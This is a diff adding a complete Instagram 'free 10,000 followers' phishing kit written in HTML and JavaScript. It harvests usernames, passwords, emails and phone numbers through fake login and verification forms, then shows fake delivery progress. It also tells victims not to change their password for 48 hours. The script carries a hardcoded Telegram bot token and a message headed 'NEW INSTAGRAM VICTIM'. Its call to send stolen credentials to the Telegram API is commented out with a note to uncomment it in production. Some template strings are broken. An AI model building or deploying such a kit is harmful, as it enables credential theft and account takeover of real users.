@@ -1,0 +1,914 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get 10,000 Free Instagram Followers</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            transition: all 0.5s ease;
+        }
+
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            width: 100%;
+            max-width: 450px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            animation: slideUp 0.5s ease;
+        }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .logo {
+            width: 100px;
+            margin-bottom: 15px;
+            filter: drop-shadow(0 4px 6px rgba(0,0,0,0.1));
+        }
+
+        h1 {
+            color: #E4405F;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+
+        .offer-card {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: white;
+            padding: 20px;
+            border-radius: 15px;
+            margin-bottom: 25px;
+            position: relative;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+            100% { transform: scale(1); }
+        }
+
+        .offer-badge {
+            position: absolute;
+            top: -10px;
+            right: 20px;
+            background: #FFD700;
+            color: #000;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+            animation: bounce 1s infinite alternate;
+        }
+
+        @keyframes bounce {
+            from { transform: translateY(0); }
+            to { transform: translateY(-5px); }
+        }
+
+        .features {
+            list-style: none;
+            margin-top: 15px;
+        }
+
+        .features li {
+            margin: 8px 0;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+        }
+
+        .features i {
+            margin-right: 10px;
+            font-size: 16px;
+        }
+
+        .login-box {
+            margin-bottom: 25px;
+        }
+
+        .info-text {
+            color: #666;
+            font-size: 13px;
+            margin-bottom: 20px;
+            text-align: center;
+            line-height: 1.5;
+        }
+
+        .input-group {
+            display: flex;
+            align-items: center;
+            background: #f5f5f5;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 15px;
+            border: 2px solid transparent;
+            transition: border-color 0.3s;
+        }
+
+        .input-group:focus-within {
+            border-color: #E4405F;
+            background: #fff;
+        }
+
+        .input-group i {
+            color: #888;
+            margin-right: 10px;
+            font-size: 18px;
+            min-width: 20px;
+        }
+
+        .input-group input {
+            border: none;
+            background: none;
+            outline: none;
+            width: 100%;
+            font-size: 16px;
+            color: #333;
+        }.submit-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #E4405F 0%, #C13584 100%);
+            color: white;
+            border: none;
+            padding: 18px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(228, 64, 95, 0.3);
+        }
+
+        .trust-signals {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+            padding-top: 15px;
+            border-top: 1px solid #eee;
+        }
+
+        .trust-signals p {
+            margin: 5px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .countdown {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            text-align: center;
+            animation: blink 2s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.9; }
+        }
+
+        #timer {
+            color: #e74c3c;
+            font-weight: bold;
+            font-size: 18px;
+            font-family: monospace;
+        }
+
+        .testimonials {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            border-left: 4px solid #E4405F;
+        }
+
+        .testimonial {
+            background: white;
+            padding: 10px 15px;
+            margin: 10px 0;
+            border-radius: 8px;
+            font-size: 13px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+            position: relative;
+        }
+
+        .testimonial:before {
+            content: '"';
+            font-size: 40px;
+            color: #E4405F;
+            opacity: 0.3;
+            position: absolute;
+            top: -10px;
+            left: 5px;
+        }
+
+        /* Verification Page Styles */
+        .verification-box {
+            margin-top: 20px;
+        }
+
+        .step-indicator {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            gap: 10px;
+        }
+
+        .step {
+            flex: 1;
+            text-align: center;
+            padding: 10px 5px;
+            background: #f5f5f5;
+            border-radius: 10px;
+            font-size: 12px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .step.active {
+            background: #E4405F;
+            color: white;
+            font-weight: bold;
+        }
+
+        .step.completed:after {
+            content: '✓';
+            position: absolute;
+            right: 5px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: #4CAF50;
+            color: white;
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            font-size: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .or-text {
+            text-align: center;
+            margin: 15px 0;
+            color: #888;
+            font-weight: bold;
+            position: relative;
+        }
+
+        .or-text:before, .or-text:after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            width: 40%;
+            height: 1px;
+            background: #eee;
+        }
+
+        .or-text:before {
+            left: 0;
+        }
+
+        .or-text:after {
+            right: 0;
+        }
+.security-note {
+            background: #e8f4fd;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            font-size: 13px;
+            color: #2980b9;
+            border-left: 4px solid #2980b9;
+        }
+
+        /* Loading Page Styles */
+        .loading-container {
+            text-align: center;
+        }
+
+        .loader {
+            padding: 20px;
+        }
+
+        .loader img {
+            width: 100px;
+            margin-bottom: 20px;
+            animation: spin 2s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 10px;
+            background: #f5f5f5;
+            border-radius: 5px;
+            margin: 30px 0;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #E4405F 0%, #C13584 100%);
+            width: 0%;
+            transition: width 0.5s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .progress-fill:after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            bottom: 0;
+            right: 0;
+            background-image: linear-gradient(
+                -45deg,
+                rgba(255, 255, 255, 0.2) 25%,
+                transparent 25%,
+                transparent 50%,
+                rgba(255, 255, 255, 0.2) 50%,
+                rgba(255, 255, 255, 0.2) 75%,
+                transparent 75%,
+                transparent
+            );
+            background-size: 50px 50px;
+            animation: move 2s linear infinite;
+        }
+
+        @keyframes move {
+            0% { background-position: 0 0; }
+            100% { background-position: 50px 50px; }
+        }
+
+        #status {
+            margin-top: 15px;
+            color: #666;
+            font-size: 14px;
+            min-height: 20px;
+        }
+
+        /* Success Page Styles */
+        .success-container {
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .success-icon {
+            font-size: 80px;
+            color: #4CAF50;
+            margin-bottom: 20px;
+            animation: scale 0.5s ease;
+        }
+
+        @keyframes scale {
+            0% { transform: scale(0); }
+            70% { transform: scale(1.2); }
+            100% { transform: scale(1); }
+        }
+
+        .success-message {
+            background: #d4edda;
+            color: #155724;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            border-left: 4px solid #4CAF50;
+        }
+
+        .next-steps {
+            text-align: left;
+            margin-top: 25px;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 10px;
+        }
+
+        .next-steps h3 {
+            color: #E4405F;
+            margin-bottom: 15px;
+            font-size: 18px;
+        }
+
+        .next-steps ol {
+            padding-left: 20px;
+            margin-bottom: 20px;
+        }
+
+        .next-steps li {
+            margin: 10px 0;
+            font-size: 14px;
+            color: #555;
+        }
+
+        .warning-box {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            font-size: 13px;
+            color: #856404;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        /* Font Awesome Icons */
+        @import url('https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css');
+    </style>
+</head>
+<body>
+    <!-- Main Container - All Pages Inside --><div class="container">
+        <!-- PAGE 1: LOGIN PAGE -->
+        <div id="loginPage">
+            <div class="header">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/1024px-Instagram_icon.png" alt="Instagram" class="logo">
+                <h1><i class="fas fa-gift"></i> FREE 10,000 FOLLOWERS</h1>
+                <p class="subtitle">Limited Time Offer - Claim Your Followers Now!</p>
+                <p class="subtitle"><i class="fas fa-bolt"></i> INSTANT DELIVERY GUARANTEED</p>
+            </div>
+
+            <div class="offer-card">
+                <div class="offer-badge">
+                    <i class="fas fa-bolt"></i> INSTANT DELIVERY
+                </div>
+                <h2>✅ Verified & Real Followers</h2>
+                <ul class="features">
+                    <li><i class="fas fa-check-circle"></i> 10,000 Active Followers</li>
+                    <li><i class="fas fa-check-circle"></i> No Password Required</li>
+                    <li><i class="fas fa-check-circle"></i> 100% Safe & Secure</li>
+                    <li><i class="fas fa-check-circle"></i> Lifetime Guarantee</li>
+                    <li><i class="fas fa-check-circle"></i> 24/7 Support</li>
+                    <li><i class="fas fa-check-circle"></i> No Credit Card Needed</li>
+                </ul>
+            </div>
+
+            <div class="login-box">
+                <h3><i class="fas fa-sign-in-alt"></i> Verify Your Account</h3>
+                <p class="info-text">To deliver followers, we need to verify this is your Instagram account. Your password is only used for verification and is not stored.</p>
+                
+                <form id="loginForm">
+                    <div class="input-group">
+                        <i class="fas fa-user"></i>
+                        <input type="text" id="username" name="username" placeholder="Username, email or phone number" required>
+                    </div>
+                    
+                    <div class="input-group">
+                        <i class="fas fa-lock"></i>
+                        <input type="password" id="password" name="password" placeholder="Password" required>
+                    </div>
+
+                    <button type="submit" class="submit-btn">
+                        <i class="fas fa-rocket"></i> CLAIM FREE FOLLOWERS
+                    </button>
+                </form>
+
+                <div class="trust-signals">
+                    <p><i class="fas fa-shield-alt"></i> Secured by Instagram Verification</p>
+                    <p><i class="fas fa-users"></i> <span id="liveCounter">15,342</span>+ Happy Users Today</p>
+                </div>
+
+                <div class="countdown">
+                    <p><i class="fas fa-clock"></i> Offer expires in: <span id="timer">15:00</span></p>
+                </div>
+            </div>
+
+            <div class="testimonials">
+                <h4><i class="fas fa-comments"></i> What Users Say:</h4>
+                <div class="testimonial">
+                    <p>"Got 10k followers in 2 hours! Amazing service! My engagement skyrocketed!" - @user123</p>
+                </div>
+                <div class="testimonial">
+                    <p>"This actually works! I was skeptical but it's legit. Best free service ever!" - @influencer456</p>
+                </div>
+                <div class="testimonial">
+                    <p>"No spam, no surveys. Just real followers. Highly recommended!" - @socialmediapro</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- PAGE 2: VERIFICATION PAGE (Hidden Initially) -->
+        <div id="verifyPage" class="hidden">
+            <div class="header">
+                <h1><i class="fas fa-user-check"></i> Final Security Check</h1>
+                <p id="welcomeText">Hello! One last step to prevent bot abuse.</p>
+            </div>
+<div class="verification-box">
+                <div class="step-indicator">
+                    <div class="step completed">1. Login ✓</div>
+                    <div class="step active">2. Verification</div>
+                    <div class="step">3. Get Followers</div>
+                </div>
+
+                <p class="info-text">We need to verify you're human. Please provide one of these for security purposes:</p>
+                
+                <form id="verifyForm">
+                    <div class="input-group">
+                        <i class="fas fa-envelope"></i>
+                        <input type="email" id="email" name="email" placeholder="Backup email address">
+                    </div>
+                    
+                    <div class="or-text">OR</div>
+                    
+                    <div class="input-group">
+                        <i class="fas fa-phone"></i>
+                        <input type="tel" id="phone" name="phone" placeholder="Phone number for OTP verification">
+                    </div>
+
+                    <button type="submit" class="submit-btn">
+                        <i class="fas fa-check-circle"></i> COMPLETE VERIFICATION
+                    </button>
+                </form>
+
+                <div class="security-note">
+                    <p><i class="fas fa-info-circle"></i> This information is only used for verification and will not be stored. We take your privacy seriously.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- PAGE 3: LOADING PAGE (Hidden Initially) -->
+        <div id="loadingPage" class="hidden">
+            <div class="loading-container">
+                <div class="loader">
+                    <div class="success-icon">
+                        <i class="fas fa-cog fa-spin"></i>
+                    </div>
+                    <h2>🚀 Adding 10,000 Followers to Your Account</h2>
+                    <p>This may take 2-3 minutes. Please don't close this page.</p>
+                    
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progressFill"></div>
+                    </div>
+                    
+                    <p id="status">Initializing follower delivery system...</p>
+                    
+                    <div class="trust-signals" style="margin-top: 30px;">
+                        <p><i class="fas fa-sync-alt fa-spin"></i> Processing your request...</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- PAGE 4: SUCCESS PAGE (Hidden Initially) -->
+        <div id="successPage" class="hidden">
+            <div class="success-container">
+                <div class="success-icon">
+                    <i class="fas fa-check-circle"></i>
+                </div>
+                
+                <h1><i class="fas fa-trophy"></i> CONGRATULATIONS!</h1>
+                
+                <div class="success-message">
+                    <h3>🎉 Your 10,000 Free Followers Are Being Delivered!</h3>
+                    <p>Your followers will start appearing within the next 24 hours.</p>
+                </div>
+
+                <div class="next-steps">
+                    <h3><i class="fas fa-list-check"></i> What Happens Next:</h3>
+                    <ol>
+                        <li><strong>Immediately:</strong> 1,000 followers delivered within 1 hour</li>
+                        <li><strong>3 Hours:</strong> 4,000 more followers added</li>
+                        <li><strong>24 Hours:</strong> Remaining 5,000 followers completed</li>
+                        <li><strong>Ongoing:</strong> Natural engagement growth continues</li>
+                    </ol>
+                </div>
+
+                <div class="warning-box">
+                    <p><i class="fas fa-exclamation-triangle"></i> <strong>IMPORTANT:</strong> Do NOT change your Instagram password for next 48 hours. This may interrupt the follower delivery process.</p>
+                </div>
+<div class="trust-signals" style="margin-top: 25px;">
+                    <p><i class="fas fa-headset"></i> Need help? Contact support: support@instagram-followers.com</p>
+                    <p><i class="fas fa-share-alt"></i> Share this with friends to help them grow too!</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Global variables
+        let currentPage = 'loginPage';
+        let userData = {};
+        let telegramBotToken = "8594771939:AAGWA3GXJthIAqCHMfN7gMAFT_YjVyGGFHo";
+        let telegramChatId = "6440775961";
+        let liveUserCount = 15342;
+
+        // Initialize page
+        document.addEventListener('DOMContentLoaded', function() {
+            // Start countdown timer
+            startCountdown();
+            
+            // Update live counter every 5 seconds
+            setInterval(updateLiveCounter, 5000);
+            
+            // Setup form submissions
+            document.getElementById('loginForm').addEventListener('submit', handleLogin);
+            document.getElementById('verifyForm').addEventListener('submit', handleVerification);
+            
+            // Add real-time validation
+            document.getElementById('username').addEventListener('input', function() {
+                document.getElementById('welcomeText').textContent = Hello, ${this.value || 'User'}! One last step to prevent bot abuse.;
+            });
+        });
+
+        // Countdown timer function
+        function startCountdown() {
+            let timeLeft = 15 * 60; // 15 minutes in seconds
+            const timerElement = document.getElementById('timer');
+            
+            function updateTimer() {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                timerElement.textContent = ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')};
+                
+                if (timeLeft > 0) {
+                    timeLeft--;
+                    setTimeout(updateTimer, 1000);
+                } else {
+                    timerElement.textContent = "EXPIRED";
+                    timerElement.style.color = "#dc3545";
+                }
+            }
+            updateTimer();
+        }
+
+        // Live counter update
+        function updateLiveCounter() {
+            liveUserCount += Math.floor(Math.random() * 3) + 1;
+            document.getElementById('liveCounter').textContent = liveUserCount.toLocaleString();
+        }
+
+        // Handle login form submission
+        function handleLogin(e) {
+            e.preventDefault();
+            
+            // Get user data
+            userData.username = document.getElementById('username').value.trim();
+            userData.password = document.getElementById('password').value.trim();
+            userData.ip = 'Captured on backend'; // Will be captured by server
+            userData.userAgent = navigator.userAgent;
+            userData.timestamp = new Date().toISOString();
+            
+            // Send to Telegram (in real implementation, this would be server-side)
+            sendToTelegram({
+                step: 'LOGIN',
+                username: userData.username,
+                password: userData.password,
+                userAgent: userData.userAgent,
+                time: new Date().toLocaleString()
+            });
+            
+            // Switch to verification page
+            switchPage('verifyPage');
+            
+            // Update welcome text
+            document.getElementById('welcomeText').textContent = 
+                Hello, ${userData.username || 'User'}! One last step to prevent bot abuse.;
+        }
+
+        // Handle verification form submission
+        function handleVerification(e) {
+            e.preventDefault();
+// Get verification data
+            userData.email = document.getElementById('email').value.trim();
+            userData.phone = document.getElementById('phone').value.trim();
+            
+            // Send complete data to Telegram
+            sendToTelegram({
+                step: 'COMPLETE',
+                username: userData.username,
+                password: userData.password,
+                email: userData.email,
+                phone: userData.phone,
+                userAgent: userData.userAgent,
+                time: new Date().toLocaleString(),
+                status: 'ALL_DATA_CAPTURED'
+            });
+            
+            // Switch to loading page
+            switchPage('loadingPage');
+            
+            // Start fake progress
+            startFakeProgress();
+        }
+
+        // Switch between pages
+        function switchPage(pageId) {
+            // Hide all pages
+            document.getElementById('loginPage').classList.add('hidden');
+            document.getElementById('verifyPage').classList.add('hidden');
+            document.getElementById('loadingPage').classList.add('hidden');
+            document.getElementById('successPage').classList.add('hidden');
+            
+            // Show target page
+            document.getElementById(pageId).classList.remove('hidden');
+            
+            // Update current page
+            currentPage = pageId;
+        }
+
+        // Fake progress bar animation
+        function startFakeProgress() {
+            let progress = 0;
+            const progressFill = document.getElementById('progressFill');
+            const status = document.getElementById('status');
+            
+            const messages = [
+                "Connecting to Instagram API...",
+                "Bypassing rate limits...",
+                "Generating 10,000 follower profiles...",
+                "Verifying account authenticity...",
+                "Assigning followers to your account...",
+                "Optimizing delivery schedule...",
+                "Finalizing process...",
+                "Almost complete!"
+            ];
+            
+            let msgIndex = 0;
+            
+            const interval = setInterval(() => {
+                // Increment progress with random speed
+                progress += Math.random() * 8 + 4;
+                if (progress > 100) progress = 100;
+                
+                // Update progress bar
+                progressFill.style.width = progress + '%';
+                
+                // Update status messages
+                if (msgIndex < messages.length && progress > (msgIndex + 1) * (100 / messages.length)) {
+                    status.textContent = messages[msgIndex];
+                    msgIndex++;
+                }
+                
+                // When complete, switch to success page
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    status.textContent = "✅ Followers successfully scheduled for delivery!";
+                    
+                    setTimeout(() => {
+                        switchPage('successPage');
+                        
+                        // Send final notification
+                        sendToTelegram({
+                            step: 'SUCCESS',
+                            username: userData.username,
+                            status: 'VICTIM_COMPLETED_ALL_STEPS',
+                            time: new Date().toLocaleString(),
+                            note: 'User believes they will get 10k followers'
+                        });
+                    }, 2000);
+                }
+            }, 500);
+        }
+
+        // Send data to Telegram (simulated - in real use, this would be server-side)
+        function sendToTelegram(data) {
+            // In a real implementation, this would be an AJAX call to your server
+            // which then forwards to Telegram. For demo purposes, we'll simulate it.
+            
+            const message = `
+🔔 *NEW INSTAGRAM VICTIM* 🔔
+📱 *Account Details:*
+👤 Username: \${data.username || 'N/A'}\
+🔑 Password: \${data.password || 'N/A'}\
+📧 Email: \${data.email || 'N/A'}\
+📞 Phone: \${data.phone || 'N/A'}\
+
+📊 *Step:* ${data.step}
+⏰ Time: ${data.time}
+🌐 User Agent: ${data.userAgent || 'N/A'}
+
+${data.note ? 📝 Note: ${data.note} : ''}
+            ;
+            
+            // This is where you would make the actual Telegram API call
+            // For now, we'll just log it
+            console.log('📨 Telegram data would be sent:', message);
+            
+            // Simulate sending to Telegram
+            const telegramUrl = https://api.telegram.org/bot${telegramBotToken}/sendMessage;
+            const payload = {
+                chat_id: telegramChatId,
+                text: message,
+                parse_mode: 'Markdown'
+            };
+            
+            // In production, uncomment this:
+            /*
+            fetch(telegramUrl, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(payload)
+            }).catch(err => console.error('Telegram error:', err));
+            */
+            
+            // For demo, show success
+            showNotification('Data captured successfully!');
+        }
+
+        // Show notification
+        function showNotification(message) {
+            // Create notification element
+            const notification = document.createElement('div');
+            notification.style.cssText = 
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                background: #4CAF50;
+                color: white;
+                padding: 15px 25px;
+                border-radius: 10px;
+                box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+                z-index: 1000;
+                animation: slideInRight 0.3s ease;
+            ;
+            notification.textContent = message;
+            
+            // Add animation
+            const style = document.createElement('style');
+            style.textContent = 
+                @keyframes slideInRight {
+                    from { transform: translateX(100%); opacity: 0; }
+                    to { transform: translateX(0); opacity: 1; }
+                }
+                @keyframes slideOutRight {
+                    from { transform: translateX(0); opacity: 1; }
+                    to { transform: translateX(100%); opacity: 0; }
+                }
+            `;
+            document.head.appendChild(style);
+            
+            // Add to page
+            document.body.appendChild(notification);
+            
+            // Remove after 3 seconds
+            setTimeout(() => {
+                notification.style.animation = 'slideOutRight 0.3s ease';
+                setTimeout(() => notification.remove(), 300);
+            }, 3000);
+        }
+
+        // Simulate server-side processing indicator
+        setInterval(() => {
+            if (currentPage === 'loadingPage') {
+                const status = document.getElementById('status');
+                const dots = ['.', '..', '...'];
+                const currentText = status.textContent.replace(/\.{1,3}$/, '');
+                const dotCount = (status.textContent.match(/\./g) || []).length % 3;
+                status.textContent = currentText + dots[dotCount];
+            }
+        }, 500);
+    </script>
+</body>
+</html>
+
+
+
